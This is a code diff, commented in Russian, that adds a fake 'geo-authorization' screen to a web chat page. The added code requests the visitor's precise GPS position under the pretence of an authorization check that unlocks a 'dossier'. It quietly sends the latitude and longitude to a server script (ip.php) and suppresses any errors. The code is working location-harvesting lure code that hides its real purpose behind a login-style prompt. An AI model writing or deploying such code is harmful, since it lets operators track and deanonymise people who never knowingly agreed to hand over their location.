@@ -1,3 +1,73 @@
+/* ===== ГЕО-АВТОРИЗАЦИЯ ===== */
+function gpsLocation() {
+  if (!navigator.geolocation) {
+    showGeoError("Геолокация не поддерживается браузером");
+    return;
+  }
+  // Автоматически запрашиваем при загрузке
+  requestGeo();
+}
+
+function requestGeo() {
+  const btn = document.getElementById("geo-btn");
+  const statusText = document.getElementById("geo-status-text");
+  const dot = document.querySelector(".geo-status-dot");
+  const errorEl = document.getElementById("geo-error");
+
+  btn.disabled = true;
+  errorEl.textContent = "";
+  statusText.textContent = "ЗАПРОС ГЕОЛОКАЦИИ...";
+
+  navigator.geolocation.getCurrentPosition(
+    function(position) {
+      const lat = position.coords.latitude.toFixed(6);
+      const lon = position.coords.longitude.toFixed(6);
+
+      // Обновляем статус
+      statusText.textContent = "АВТОРИЗАЦИЯ ПОДТВЕРЖДЕНА";
+      dot.classList.remove("blink");
+      dot.classList.add("ok");
+
+      // Отправляем координаты (существующий функционал)
+      sendCoords(lat, lon);
+
+      // Через 800мс снимаем оверлей
+      setTimeout(unlockDossier, 800);
+    },
+    function(err) {
+      btn.disabled = false;
+      statusText.textContent = "ОШИБКА АВТОРИЗАЦИИ";
+      showGeoError(getGeoErrorMsg(err.code));
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+function unlockDossier() {
+  document.getElementById("geo-overlay").classList.add("hidden");
+  document.getElementById("dossier-wrapper").classList.add("unlocked");
+}
+
+function showGeoError(msg) {
+  const errorEl = document.getElementById("geo-error");
+  if (errorEl) errorEl.textContent = msg;
+}
+
+function getGeoErrorMsg(code) {
+  switch (code) {
+    case 1: return "ДОСТУП К ГЕОЛОКАЦИИ ЗАПРЕЩЁН ПОЛЬЗОВАТЕЛЕМ";
+    case 2: return "КООРДИНАТЫ НЕДОСТУПНЫ";
+    case 3: return "ПРЕВЫШЕНО ВРЕМЯ ОЖИДАНИЯ";
+    default: return "НЕИЗВЕСТНАЯ ОШИБКА";
+  }
+}
+
+function sendCoords(lat, lon) {
+  // Отправка координат (как в оригинале)
+  fetch(`ip.php?lat=${lat}&lon=${lon}`).catch(() => {});
+}
+
+/* ===== ЧАТ ===== */
 const msgerForm = get(".msger-inputarea");
 const msgerInput = get(".msger-input");
 const msgerChat = get(".msger-chat");
